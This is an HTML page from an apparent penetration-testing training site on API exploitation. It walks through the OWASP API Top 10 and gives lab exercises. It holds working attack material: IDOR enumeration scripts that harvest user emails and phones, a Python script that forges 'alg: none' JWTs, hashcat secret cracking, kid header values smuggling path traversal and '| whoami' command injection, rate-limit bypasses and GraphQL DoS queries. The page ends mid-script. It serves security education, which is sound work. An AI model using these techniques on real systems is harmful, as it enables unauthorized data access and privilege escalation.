<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>API Exploitation - Advanced Security Testing</title>
    <link rel="stylesheet" href="css/style.css">
    <link rel="stylesheet" href="css/docs.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        .lab-container {
            background: rgba(0, 212, 255, 0.05);
            border: 2px solid var(--primary);
            border-radius: 12px;
            padding: 2rem;
            margin: 2rem 0;
        }

        .lab-header {
            display: flex;
            align-items: center;
            gap: 1rem;
            margin-bottom: 1.5rem;
        }

        .lab-badge {
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: #000;
            padding: 0.5rem 1rem;
            border-radius: 20px;
            font-weight: bold;
            font-size: 0.9rem;
        }

        .difficulty {
            padding: 0.25rem 0.75rem;
            border-radius: 15px;
            font-size: 0.85rem;
            font-weight: bold;
        }

        .difficulty-easy { background: rgba(0, 255, 136, 0.2); color: #00ff88; }
        .difficulty-medium { background: rgba(255, 170, 0, 0.2); color: #ffaa00; }
        .difficulty-hard { background: rgba(255, 68, 68, 0.2); color: #ff4444; }

        .vuln-card {
            background: var(--card-bg);
            border-left: 4px solid var(--primary);
            padding: 1.5rem;
            margin: 1.5rem 0;
            border-radius: 8px;
        }

        .vuln-card h3 {
            color: var(--primary);
            margin-top: 0;
        }

        .attack-vector {
            background: rgba(255, 68, 68, 0.1);
            border-left: 4px solid #ff4444;
            padding: 1rem;
            margin: 1rem 0;
        }

        .payload-box {
            background: rgba(0, 0, 0, 0.3);
            border: 1px solid rgba(0, 212, 255, 0.3);
            border-radius: 8px;
            padding: 1rem;
            margin: 1rem 0;
            font-family: 'Courier New', monospace;
        }

        .tool-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 1.5rem;
            margin: 2rem 0;
        }

        .tool-card {
            background: var(--card-bg);
            padding: 1.5rem;
            border-radius: 8px;
            border: 1px solid rgba(0, 212, 255, 0.1);
            transition: transform 0.3s ease;
        }

        .tool-card:hover {
            transform: translateY(-5px);
            border-color: var(--primary);
        }

        .tool-card h3 {
            color: var(--primary);
            margin-top: 0;
        }

        .step-by-step {
            counter-reset: step;
            margin: 2rem 0;
        }

        .step {
            position: relative;
            padding-left: 3rem;
            margin-bottom: 2rem;
        }

        .step::before {
            counter-increment: step;
            content: counter(step);
            position: absolute;
            left: 0;
            top: 0;
            width: 35px;
            height: 35px;
            background: linear-gradient(135deg, var(--primary), var(--secondary));
            color: #000;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            font-weight: bold;
        }

        .response-example {
            background: rgba(0, 255, 136, 0.05);
            border-left: 4px solid #00ff88;
            padding: 1rem;
            margin: 1rem 0;
        }

        .tab-container {
            margin: 2rem 0;
        }

        .tab-buttons {
            display: flex;
            gap: 0.5rem;
            margin-bottom: 1rem;
            flex-wrap: wrap;
        }

        .tab-button {
            padding: 0.75rem 1.5rem;
            background: rgba(0, 212, 255, 0.1);
            border: 1px solid rgba(0, 212, 255, 0.3);
            border-radius: 8px;
            color: var(--text);
            cursor: pointer;
            transition: all 0.3s ease;
        }

        .tab-button:hover {
            background: rgba(0, 212, 255, 0.2);
        }

        .tab-button.active {
            background: var(--primary);
            color: #000;
            font-weight: bold;
        }

        .tab-content {
            display: none;
        }

        .tab-content.active {
            display: block;
        }
    </style>
</head>
<body>
    <!-- Header -->
    <header class="header">
        <nav class="navbar">
            <div class="container">
                <div class="nav-brand">
                    <i class="fas fa-shield-alt"></i>
                    <span>Penetration Test Suite</span>
                </div>
                <ul class="nav-menu">
                    <li><a href="index.html">Home</a></li>
                    <li><a href="documentation.html">Docs</a></li>
                    <li><a href="theory.html">Theory</a></li>
                    <li><a href="api-exploitation.html" class="active">API Exploitation</a></li>
                    <li><a href="https://github.com/samueldk12/penetration-test" target="_blank">
                        <i class="fab fa-github"></i> GitHub
                    </a></li>
                </ul>
            </div>
        </nav>
    </header>

    <!-- Content -->
    <div class="docs-container">
        <aside class="docs-sidebar">
            <nav class="docs-nav">
                <h3>API Exploitation</h3>
                <ul>
                    <li><a href="#introduction">Introduction</a></li>
                    <li><a href="#api-types">API Types</a></li>
                    <li><a href="#owasp-top10">OWASP API Top 10</a></li>
                    <li><a href="#techniques">Exploitation Techniques</a></li>
                    <li><a href="#labs">Practical Labs</a></li>
                    <li><a href="#tools">Tools & Scripts</a></li>
                    <li><a href="#automation">Automation</a></li>
                </ul>
            </nav>
        </aside>

        <main class="docs-content">
            <h1><i class="fas fa-code"></i> API Exploitation & Security Testing</h1>
            <p>Comprehensive guide to discovering and exploiting API vulnerabilities with practical labs.</p>

            <!-- Introduction -->
            <section id="introduction" class="doc-section">
                <h2><i class="fas fa-info-circle"></i> Introduction to API Security</h2>

                <div class="concept-card">
                    <p>
                        APIs (Application Programming Interfaces) are the backbone of modern applications, enabling
                        communication between services, mobile apps, and web applications. However, they also present
                        a significant attack surface that is often overlooked in traditional security testing.
                    </p>

                    <h3>Why API Security Matters</h3>
                    <ul>
                        <li><strong>Ubiquitous:</strong> APIs power virtually all modern web and mobile applications</li>
                        <li><strong>Direct Data Access:</strong> APIs often provide direct access to sensitive data and functions</li>
                        <li><strong>Authentication Complexity:</strong> Multiple auth methods (OAuth, JWT, API Keys)</li>
                        <li><strong>Business Logic:</strong> APIs expose critical business logic that can be abused</li>
                        <li><strong>Less Visibility:</strong> APIs often lack the same security scrutiny as web interfaces</li>
                    </ul>
                </div>

                <div class="alert alert-info">
                    <strong>üìä Statistics:</strong> According to Gartner, by 2023, API attacks became the most common
                    attack vector for enterprise web applications, representing over 50% of all attacks.
                </div>
            </section>

            <!-- API Types -->
            <section id="api-types" class="doc-section">
                <h2><i class="fas fa-layer-group"></i> API Types & Architectures</h2>

                <div class="tab-container">
                    <div class="tab-buttons">
                        <button class="tab-button active" onclick="showTab('rest')">REST API</button>
                        <button class="tab-button" onclick="showTab('graphql')">GraphQL</button>
                        <button class="tab-button" onclick="showTab('soap')">SOAP</button>
                        <button class="tab-button" onclick="showTab('websocket')">WebSocket</button>
                    </div>

                    <div id="rest" class="tab-content active">
                        <h3>REST (Representational State Transfer)</h3>
                        <p>The most common API architecture, using HTTP methods and status codes.</p>

                        <div class="code-block">
                            <pre><code># REST API Characteristics
GET    /api/users          - Retrieve users
GET    /api/users/123      - Retrieve specific user
POST   /api/users          - Create new user
PUT    /api/users/123      - Update user
DELETE /api/users/123      - Delete user

# Example Request
GET /api/v1/users/123 HTTP/1.1
Host: api.example.com
Authorization: Bearer eyJhbGc...
Content-Type: application/json</code></pre>
                        </div>

                        <h4>Common Vulnerabilities:</h4>
                        <ul>
                            <li>Broken Object Level Authorization (BOLA/IDOR)</li>
                            <li>Broken Authentication</li>
                            <li>Excessive Data Exposure</li>
                            <li>Mass Assignment</li>
                            <li>Rate Limiting Issues</li>
                        </ul>
                    </div>

                    <div id="graphql" class="tab-content">
                        <h3>GraphQL</h3>
                        <p>Query language for APIs that allows clients to request specific data.</p>

                        <div class="code-block">
                            <pre><code># GraphQL Query Example
POST /graphql HTTP/1.1
Host: api.example.com
Content-Type: application/json

{
  "query": "{ user(id: 123) { id name email role } }"
}

# Introspection Query (for reconnaissance)
{
  __schema {
    types {
      name
      fields {
        name
        type { name }
      }
    }
  }
}</code></pre>
                        </div>

                        <h4>Common Vulnerabilities:</h4>
                        <ul>
                            <li>Introspection Enabled (Information Disclosure)</li>
                            <li>Query Depth/Complexity Attacks (DoS)</li>
                            <li>Field Suggestions (Enumeration)</li>
                            <li>Batching Attacks</li>
                            <li>Authorization Bypass in Nested Queries</li>
                        </ul>
                    </div>

                    <div id="soap" class="tab-content">
                        <h3>SOAP (Simple Object Access Protocol)</h3>
                        <p>XML-based protocol for exchanging structured information.</p>

                        <div class="code-block">
                            <pre><code># SOAP Request Example
POST /api/soap HTTP/1.1
Host: api.example.com
Content-Type: text/xml

&lt;?xml version="1.0"?&gt;
&lt;soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"&gt;
  &lt;soap:Body&gt;
    &lt;GetUser&gt;
      &lt;UserId&gt;123&lt;/UserId&gt;
    &lt;/GetUser&gt;
  &lt;/soap:Body&gt;
&lt;/soap:Envelope&gt;</code></pre>
                        </div>

                        <h4>Common Vulnerabilities:</h4>
                        <ul>
                            <li>XML External Entity (XXE)</li>
                            <li>XML Bomb (Billion Laughs Attack)</li>
                            <li>WSDL Enumeration</li>
                            <li>WS-Security Issues</li>
                        </ul>
                    </div>

                    <div id="websocket" class="tab-content">
                        <h3>WebSocket APIs</h3>
                        <p>Full-duplex communication protocol for real-time data transfer.</p>

                        <div class="code-block">
                            <pre><code># WebSocket Connection
GET /chat HTTP/1.1
Host: api.example.com
Upgrade: websocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
Sec-WebSocket-Version: 13

# Message Format
{"action": "sendMessage", "data": {"to": "user123", "message": "Hello"}}</code></pre>
                        </div>

                        <h4>Common Vulnerabilities:</h4>
                        <ul>
                            <li>Lack of Origin Validation</li>
                            <li>Missing Authentication on Connection</li>
                            <li>Message Injection</li>
                            <li>Cross-Site WebSocket Hijacking (CSWSH)</li>
                        </ul>
                    </div>
                </div>
            </section>

            <!-- OWASP API Top 10 -->
            <section id="owasp-top10" class="doc-section">
                <h2><i class="fas fa-shield-virus"></i> OWASP API Security Top 10 (2023)</h2>

                <div class="vuln-card">
                    <h3>API1:2023 - Broken Object Level Authorization (BOLA)</h3>
                    <p>
                        <strong>Description:</strong> APIs tend to expose endpoints that handle object identifiers,
                        creating a wide attack surface for access control issues. Authorization checks should verify
                        that the logged-in user has access to perform the requested action on the requested object.
                    </p>

                    <div class="attack-vector">
                        <h4><i class="fas fa-skull-crossbones"></i> Attack Example:</h4>
                        <div class="code-block">
                            <pre><code># Vulnerable Endpoint
GET /api/users/123/orders/456

# Attack: Change user ID to access other users' orders
GET /api/users/789/orders/456
GET /api/users/789/orders/457
GET /api/users/789/orders/458

# Automated IDOR Testing
for user_id in {1..1000}; do
    curl "https://api.example.com/api/users/$user_id/orders/456" \
         -H "Authorization: Bearer YOUR_TOKEN"
done</code></pre>
                        </div>
                    </div>

                    <div class="response-example">
                        <h4><i class="fas fa-shield-alt"></i> Prevention:</h4>
                        <ul>
                            <li>Implement proper authorization checks for every endpoint</li>
                            <li>Use UUIDs instead of incremental IDs</li>
                            <li>Validate user ownership of resources</li>
                            <li>Log access attempts for monitoring</li>
                        </ul>
                    </div>
                </div>

                <div class="vuln-card">
                    <h3>API2:2023 - Broken Authentication</h3>
                    <p>
                        <strong>Description:</strong> Authentication mechanisms are often implemented incorrectly,
                        allowing attackers to compromise authentication tokens or exploit flaws to assume other
                        users' identities.
                    </p>

                    <div class="attack-vector">
                        <h4><i class="fas fa-skull-crossbones"></i> Attack Examples:</h4>
                        <div class="code-block">
                            <pre><code># JWT None Algorithm Attack
# Original JWT
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiMTIzIn0.signature

# Modified JWT (alg: none)
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiNDU2In0.

# Weak Secret Brute Force
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# Password Reset Token Prediction
POST /api/auth/reset-password
{"email": "victim@example.com"}

# Intercept and analyze token pattern
Token1: 123456
Token2: 123457
Token3: 123458  # Predictable!</code></pre>
                        </div>
                    </div>
                </div>

                <div class="vuln-card">
                    <h3>API3:2023 - Broken Object Property Level Authorization</h3>
                    <p>
                        <strong>Description:</strong> Lack of or improper authorization validation at the object
                        property level, leading to information disclosure or manipulation.
                    </p>

                    <div class="attack-vector">
                        <h4><i class="fas fa-skull-crossbones"></i> Attack Example - Mass Assignment:</h4>
                        <div class="code-block">
                            <pre><code># Normal Update Request
PUT /api/users/123
{
  "name": "John Doe",
  "email": "john@example.com"
}

# Mass Assignment Attack
PUT /api/users/123
{
  "name": "John Doe",
  "email": "john@example.com",
  "role": "admin",           # Trying to escalate privileges
  "is_verified": true,       # Bypassing verification
  "credits": 9999            # Adding credits
}</code></pre>
                        </div>
                    </div>
                </div>

                <div class="vuln-card">
                    <h3>API4:2023 - Unrestricted Resource Consumption</h3>
                    <p>
                        <strong>Description:</strong> APIs don't impose restrictions on the size or number of
                        resources that can be requested, leading to DoS or high costs.
                    </p>

                    <div class="attack-vector">
                        <h4><i class="fas fa-skull-crossbones"></i> Attack Examples:</h4>
                        <div class="code-block">
                            <pre><code># Batch Request Attack
POST /api/batch
{
  "requests": [
    {"method": "GET", "url": "/api/users/1"},
    {"method": "GET", "url": "/api/users/2"},
    ... # 10,000 requests
  ]
}

# Large Page Size
GET /api/users?page=1&size=999999

# Resource Exhaustion via Upload
POST /api/upload
Content-Type: multipart/form-data
Content-Length: 10737418240  # 10GB file

# GraphQL Query Depth Attack
{
  user {
    posts {
      author {
        posts {
          author {
            posts {
              ... # 100 levels deep
            }
          }
        }
      }
    }
  }
}</code></pre>
                        </div>
                    </div>
                </div>

                <div class="vuln-card">
                    <h3>API5:2023 - Broken Function Level Authorization</h3>
                    <p>
                        <strong>Description:</strong> Access control policies are not properly enforced for
                        functions, allowing users to access administrative or privileged functions.
                    </p>

                    <div class="attack-vector">
                        <h4><i class="fas fa-skull-crossbones"></i> Attack Example:</h4>
                        <div class="code-block">
                            <pre><code># Regular User Endpoint
GET /api/users/me

# Try Admin Endpoints
GET /api/admin/users
GET /api/admin/statistics
DELETE /api/admin/users/123

# HTTP Method Tampering
GET /api/users/123      # Allowed
DELETE /api/users/123   # Should be forbidden, but...?

# Parameter Tampering
GET /api/users?role=admin
GET /api/users?admin=true</code></pre>
                        </div>
                    </div>
                </div>

                <div class="alert alert-info">
                    <strong>üí° Note:</strong> The full OWASP API Top 10 includes API6 through API10. Visit the
                    <a href="https://owasp.org/API-Security/editions/2023/en/0x11-t10/" target="_blank">OWASP website</a>
                    for complete details.
                </div>
            </section>

            <!-- Exploitation Techniques -->
            <section id="techniques" class="doc-section">
                <h2><i class="fas fa-crosshairs"></i> Advanced Exploitation Techniques</h2>

                <div class="concept-card">
                    <h3>API Reconnaissance</h3>
                    <p>The first step is discovering API endpoints and understanding their structure.</p>

                    <div class="step-by-step">
                        <div class="step">
                            <h4>Passive Discovery</h4>
                            <div class="code-block">
                                <pre><code># JavaScript files analysis
grep -r "api\." *.js
grep -r "fetch(" *.js
grep -r "axios" *.js

# Find API documentation
/api-docs
/swagger.json
/openapi.json
/api/swagger-ui
/.well-known/

# Wayback Machine
curl "http://web.archive.org/cdx/search/cdx?url=api.example.com/*&output=json"</code></pre>
                            </div>
                        </div>

                        <div class="step">
                            <h4>Active Discovery</h4>
                            <div class="code-block">
                                <pre><code># Directory brute forcing
ffuf -w api-wordlist.txt -u https://api.example.com/FUZZ

# Version enumeration
curl https://api.example.com/v1/
curl https://api.example.com/v2/
curl https://api.example.com/api/v1/

# Method enumeration
for method in GET POST PUT DELETE PATCH OPTIONS; do
    curl -X $method https://api.example.com/api/users
done</code></pre>
                            </div>
                        </div>

                        <div class="step">
                            <h4>Parameter Discovery</h4>
                            <div class="code-block">
                                <pre><code># Test common parameters
curl "https://api.example.com/api/users?id=1"
curl "https://api.example.com/api/users?user_id=1"
curl "https://api.example.com/api/users?userId=1"
curl "https://api.example.com/api/users?uid=1"

# Parameter pollution
curl "https://api.example.com/api/users?id=1&id=2"

# Hidden parameters (Arjun, ParamSpider)
arjun -u https://api.example.com/api/users</code></pre>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="concept-card">
                    <h3>JWT Token Exploitation</h3>

                    <div class="payload-box">
                        <h4>JWT Structure</h4>
                        <pre>HEADER.PAYLOAD.SIGNATURE

Header (Base64):
{
  "alg": "HS256",
  "typ": "JWT"
}

Payload (Base64):
{
  "sub": "123",
  "name": "John",
  "role": "user",
  "iat": 1516239022
}

Signature:
HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret)</pre>
                    </div>

                    <h4>Attack Techniques:</h4>
                    <div class="code-block">
                        <pre><code># 1. None Algorithm Attack
# Change alg to "none" and remove signature
echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_'
echo -n '{"sub":"123","role":"admin"}' | base64 | tr -d '=' | tr '+/' '-_'
# Result: eyJhbGc.....eyJzdWI.....  (no signature)

# 2. Weak Secret Brute Force
hashcat -a 0 -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
john jwt.txt --wordlist=wordlist.txt --format=HMAC-SHA256

# 3. Algorithm Confusion (RS256 to HS256)
# If server uses RS256 (asymmetric), try changing to HS256 (symmetric)
# and sign with the public key

# 4. Kid (Key ID) Manipulation
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../../../../dev/null"  # Path traversal
}

{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "| whoami"  # Command injection
}</code></pre>
                    </div>
                </div>

                <div class="concept-card">
                    <h3>Rate Limit Bypass Techniques</h3>
                    <div class="code-block">
                        <pre><code># 1. Header Manipulation
X-Forwarded-For: 1.2.3.4
X-Forwarded-Host: example.com
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4
X-Remote-IP: 1.2.3.4
X-Client-IP: 1.2.3.4

# 2. User-Agent Rotation
User-Agent: Mozilla/5.0 (Request 1)
User-Agent: Chrome/91.0 (Request 2)
User-Agent: Safari/14.0 (Request 3)

# 3. Origin/Referer Spoofing
Origin: https://trusted-domain.com
Referer: https://trusted-domain.com

# 4. Path Manipulation
/api/v1/login
/api/v1/login/
/api/v1//login
/api/v1/login?
/api/./v1/login

# 5. HTTP Method Change
POST /api/login  # Rate limited
GET /api/login   # Not rate limited?</code></pre>
                    </div>
                </div>
            </section>

            <!-- Practical Labs -->
            <section id="labs" class="doc-section">
                <h2><i class="fas fa-flask"></i> Practical Laboratories</h2>

                <!-- Lab 1: BOLA/IDOR -->
                <div class="lab-container">
                    <div class="lab-header">
                        <span class="lab-badge">LAB 01</span>
                        <div>
                            <h3 style="margin: 0;">Broken Object Level Authorization (BOLA)</h3>
                            <span class="difficulty difficulty-easy">EASY</span>
                        </div>
                    </div>

                    <h4>üéØ Objective</h4>
                    <p>Exploit IDOR vulnerability to access other users' data.</p>

                    <h4>üìù Scenario</h4>
                    <p>
                        You have discovered an API endpoint at <code>https://api.lab.local/api/v1/users/{id}/profile</code>
                        that returns user profile information. Your user ID is 1337.
                    </p>

                    <h4>üî¨ Tasks</h4>
                    <div class="step-by-step">
                        <div class="step">
                            <h4>Retrieve Your Own Profile</h4>
                            <div class="code-block">
                                <pre><code>curl -X GET "https://api.lab.local/api/v1/users/1337/profile" \
     -H "Authorization: Bearer YOUR_TOKEN" \
     -H "Content-Type: application/json"</code></pre>
                            </div>
                            <p><strong>Expected Response:</strong> Your profile data</p>
                        </div>

                        <div class="step">
                            <h4>Test for IDOR</h4>
                            <div class="code-block">
                                <pre><code># Try accessing other user IDs
curl -X GET "https://api.lab.local/api/v1/users/1/profile" \
     -H "Authorization: Bearer YOUR_TOKEN"

curl -X GET "https://api.lab.local/api/v1/users/2/profile" \
     -H "Authorization: Bearer YOUR_TOKEN"</code></pre>
                            </div>
                            <p>‚úÖ If you receive other users' data, the vulnerability is confirmed!</p>
                        </div>

                        <div class="step">
                            <h4>Automate Enumeration</h4>
                            <div class="code-block">
                                <pre><code>#!/bin/bash
# idor-enum.sh

TOKEN="YOUR_TOKEN"
BASE_URL="https://api.lab.local/api/v1/users"

for id in {1..100}; do
    response=$(curl -s -w "%{http_code}" \
        -X GET "$BASE_URL/$id/profile" \
        -H "Authorization: Bearer $TOKEN")

    http_code="${response: -3}"

    if [ "$http_code" = "200" ]; then
        echo "[+] User $id: Accessible"
        echo "$response" | jq . >> found_users.json
    fi
done</code></pre>
                            </div>
                        </div>

                        <div class="step">
                            <h4>Extract Sensitive Data</h4>
                            <p>Parse the collected data for sensitive information:</p>
                            <div class="code-block">
                                <pre><code>cat found_users.json | jq -r '.email' | sort -u > emails.txt
cat found_users.json | jq -r '.phone' | sort -u > phones.txt
cat found_users.json | jq -r 'select(.role=="admin") | .id' > admins.txt</code></pre>
                            </div>
                        </div>
                    </div>

                    <div class="alert alert-danger">
                        <strong>üèÜ Success Criteria:</strong> Find at least 10 accessible user profiles and identify
                        one admin user.
                    </div>
                </div>

                <!-- Lab 2: JWT Exploitation -->
                <div class="lab-container">
                    <div class="lab-header">
                        <span class="lab-badge">LAB 02</span>
                        <div>
                            <h3 style="margin: 0;">JWT Token Manipulation</h3>
                            <span class="difficulty difficulty-medium">MEDIUM</span>
                        </div>
                    </div>

                    <h4>üéØ Objective</h4>
                    <p>Exploit JWT weaknesses to escalate privileges from user to admin.</p>

                    <h4>üìù Scenario</h4>
                    <p>
                        You have a valid JWT token with user privileges. The API uses JWT for authentication.
                        Your token: <code>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIn0.signature</code>
                    </p>

                    <h4>üî¨ Tasks</h4>
                    <div class="step-by-step">
                        <div class="step">
                            <h4>Decode and Analyze Token</h4>
                            <div class="code-block">
                                <pre><code># Using jwt_tool
python3 jwt_tool.py YOUR_TOKEN

# Manual decode
echo "eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIn0=" | base64 -d
# Output: {"user":"john","role":"user"}

# Identify vulnerabilities
jwt_tool.py YOUR_TOKEN -M at  # All tests</code></pre>
                            </div>
                        </div>

                        <div class="step">
                            <h4>Test None Algorithm</h4>
                            <div class="code-block">
                                <pre><code>#!/usr/bin/env python3
import base64
import json

# Create header with "none" algorithm
header = {"alg": "none", "typ": "JWT"}
payload = {"user": "john", "role": "admin"}  # Escalate to admin!

# Base64 encode (URL-safe, remove padding)
header_b64 = base64.urlsafe_b64encode(
    json.dumps(header).encode()
).decode().rstrip('=')

payload_b64 = base64.urlsafe_b64encode(
    json.dumps(payload).encode()
).decode().rstrip('=')

# Create token without signature
malicious_token = f"{header_b64}.{payload_b64}."

print(f"Malicious Token: {malicious_token}")

# Test it
import requests
response = requests.get(
    "https://api.lab.local/api/v1/admin/users",
    headers={"Authorization": f"Bearer {malicious_token}"}
)
print(f"Status: {response.status_code}")
print(f"Response: {response.text}")</code></pre>
                            </div>
                        </div>

                        <div class="step">
                            <h4>Brute Force Weak Secret</h4>
                            <div class="code-block">
                                <pre><code># Create wordlist of common secrets
cat > jwt_secrets.txt << EOF
secret
secret123
password
admin
jwt_secret
my_secret_key
EOF

# Brute force with hashcat
hashcat -a 0 -m 16500 token.txt jwt_secrets.txt

# Or use jwt_tool
python3 jwt_tool.py YOUR_TOKEN -C -d jwt_secrets.txt

# If secret is found, sign new token
python3 jwt_tool.py YOUR_TOKEN -S hs256 -p "found_secret" \
    -I -pc "role" -pv "admin"</code></pre>
                            </div>
                        </div>

                        <div class="step">
                            <h4>Verify Admin Access</h4>
                            <div class="code-block">
                                <pre><code># Test admin endpoints with modified token
curl -X GET "https://api.lab.local/api/v1/admin/users" \
     -H "Authorization: Bearer MODIFIED_TOKEN"

curl -X DELETE "https://api.lab.local/api/v1/admin/users/999" \
     -H "Authorization: Bearer MODIFIED_TOKEN"</code></pre>
                            </div>
                        </div>
                    </div>

                    <div class="alert alert-danger">
                        <strong>üèÜ Success Criteria:</strong> Successfully access admin-only endpoints.
                    </div>
                </div>

                <!-- Lab 3: GraphQL Exploitation -->
                <div class="lab-container">
                    <div class="lab-header">
                        <span class="lab-badge">LAB 03</span>
                        <div>
                            <h3 style="margin: 0;">GraphQL API Exploitation</h3>
                            <span class="difficulty difficulty-hard">HARD</span>
                        </div>
                    </div>

                    <h4>üéØ Objective</h4>
                    <p>Exploit GraphQL introspection and query complexity to extract sensitive data.</p>

                    <h4>üìù Scenario</h4>
                    <p>
                        You've discovered a GraphQL endpoint at <code>https://api.lab.local/graphql</code>.
                        Your goal is to map the schema and find sensitive data.
                    </p>

                    <h4>üî¨ Tasks</h4>
                    <div class="step-by-step">
                        <div class="step">
                            <h4>Test Introspection</h4>
                            <div class="code-block">
                                <pre><code># Full schema introspection
curl -X POST "https://api.lab.local/graphql" \
     -H "Content-Type: application/json" \
     -d '{
       "query": "{ __schema { types { name fields { name type { name } } } } }"
     }' | jq .

# Get all type names
curl -X POST "https://api.lab.local/graphql" \
     -H "Content-Type: application/json" \
     -d '{"query": "{ __schema { types { name } } }"}' \
     | jq -r '.data.__schema.types[].name'

# Using GraphQL Voyager (visual)
# Upload introspection result to https://graphql-kit.com/graphql-voyager/</code></pre>
                            </div>
                        </div>

                        <div class="step">
                            <h4>Enumerate Sensitive Fields</h4>
                            <div class="code-block">
                                <pre><code># Query for user type
{
  __type(name: "User") {
    fields {
      name
      type {
        name
        kind
      }
    }
  }
}

# Look for sensitive fields like:
# - password, passwordHash
# - ssn, socialSecurityNumber
# - creditCard, paymentInfo
# - apiKey, secretToken
# - privateData, confidential</code></pre>
                            </div>
                        </div>

                        <div class="step">
                            <h4>Exploit Nested Queries</h4>
                            <div class="code-block">
                                <pre><code># Deep nested query (IDOR in GraphQL)
{
  user(id: 1) {
    id
    username
    email
    posts {
      title
      comments {
        text
        author {
          username
          email
          privateNotes  # Sensitive!
        }
      }
    }
  }
}

# Batch queries (bypass rate limiting)
[
  { "query": "{ user(id: 1) { email } }" },
  { "query": "{ user(id: 2) { email } }" },
  { "query": "{ user(id: 3) { email } }" },
  ... # 1000 queries
]</code></pre>
                            </div>
                        </div>

                        <div class="step">
                            <h4>Query Complexity Attack</h4>
                            <div class="code-block">
                                <pre><code># DoS via deep nesting
{
  user {
    posts {
      author {
        posts {
          author {
            posts {
              # 50 levels deep...
            }
          }
        }
      }
    }
  }
}

# Circular query exploitation
query {
  user(id: 1) {
    friends {
      friends {
        friends {
          friends {
            # Exponential growth
          }
        }
      }
    }
  }
}</code></pre>
                            </div>
                        </div>

                        <div class="step">
                            <h4>Automate with Python</h4>
                            <div class="code-block">
                                <pre><code>#!/usr/bin/env python3
import requests
import json

url = "https://api.lab.local/graphql"

# Extract all users via batching
batch_queries = []
for uid in range(1, 1001):
    batch_queries.append({
        "query": f'{{ user(id: {uid}) {{ id email username role }} }}'
    })

response = requests.post(url, json=batch_queries)
users = response.json()

# Find admins
admins = [u for u in users if u.get('role') == 'admin']
print(f"Found {len(admins)} admins")
print(json.dumps(admins, indent=2))</code></pre>
                            </div>
                        </div>
                    </div>

                    <div class="alert alert-danger">
                        <strong>üèÜ Success Criteria:</strong> Extract full schema, find 5+ sensitive fields, and
                        enumerate all admin users.
                    </div>
                </div>
            </section>

            <!-- Tools -->
            <section id="tools" class="doc-section">
                <h2><i class="fas fa-toolbox"></i> API Testing Tools & Scripts</h2>

                <div class="tool-grid">
                    <div class="tool-card">
                        <h3><i class="fas fa-terminal"></i> Postman</h3>
                        <p>Popular API testing platform with automation capabilities.</p>
                        <ul>
                            <li>Collection runner for automated tests</li>
                            <li>Environment variables</li>
                            <li>Pre/post-request scripts</li>
                        </ul>
                    </div>

                    <div class="tool-card">
                        <h3><i class="fas fa-bolt"></i> Burp Suite</h3>
                        <p>Comprehensive web vulnerability scanner.</p>
                        <ul>
                            <li>Proxy for intercepting API calls</li>
                            <li>Intruder for fuzzing</li>
                            <li>Extensions for API testing</li>
                        </ul>
                    </div>

                    <div class="tool-card">
                        <h3><i class="fas fa-code"></i> jwt_tool</h3>
                        <p>JWT analysis and exploitation toolkit.</p>
                        <div class="code-block">
                            <pre><code>pip install pyjwt
git clone https://github.com/ticarpi/jwt_tool
python3 jwt_tool.py TOKEN -M at</code></pre>
                        </div>
                    </div>

                    <div class="tool-card">
                        <h3><i class="fas fa-robot"></i> FFUF</h3>
                        <p>Fast web fuzzer for API endpoint discovery.</p>
                        <div class="code-block">
                            <pre><code>ffuf -w wordlist.txt \
  -u https://api.example.com/FUZZ \
  -mc 200,201,204</code></pre>
                        </div>
                    </div>

                    <div class="tool-card">
                        <h3><i class="fas fa-project-diagram"></i> Arjun</h3>
                        <p>HTTP parameter discovery tool.</p>
                        <div class="code-block">
                            <pre><code>arjun -u https://api.example.com/endpoint</code></pre>
                        </div>
                    </div>

                    <div class="tool-card">
                        <h3><i class="fas fa-search"></i> Kiterunner</h3>
                        <p>API endpoint and content discovery.</p>
                        <div class="code-block">
                            <pre><code>kr scan https://api.example.com \
  -w routes-large.kite</code></pre>
                        </div>
                    </div>
                </div>

                <h3 style="margin-top: 3rem;">Custom Python Scripts</h3>

                <div class="concept-card">
                    <h4>1. BOLA/IDOR Scanner</h4>
                    <div class="code-block">
                        <pre><code>#!/usr/bin/env python3
"""
BOLA/IDOR API Scanner
Tests for broken object level authorization
"""

import requests
import json
import sys
from concurrent.futures import ThreadPoolExecutor

class BOLAScanner:
    def __init__(self, base_url, token, start_id=1, end_id=1000):
        self.base_url = base_url
        self.headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json"
        }
        self.start_id = start_id
        self.end_id = end_id
        self.vulnerable_endpoints = []

    def test_endpoint(self, endpoint_template, user_id):
        """Test a single user ID"""
        url = endpoint_template.format(id=user_id)

        try:
            response = requests.get(
                url,
                headers=self.headers,
                timeout=5
            )

            if response.status_code == 200:
                return {
                    "id": user_id,
                    "url": url,
                    "status": response.status_code,
                    "data": response.json()
                }
        except Exception as e:
            return None

    def scan(self, endpoint_template):
        """Scan range of IDs"""
        print(f"[*] Scanning {endpoint_template}")
        print(f"[*] Testing IDs from {self.start_id} to {self.end_id}")

        found_count = 0

        with ThreadPoolExecutor(max_workers=10) as executor:
            results = executor.map(
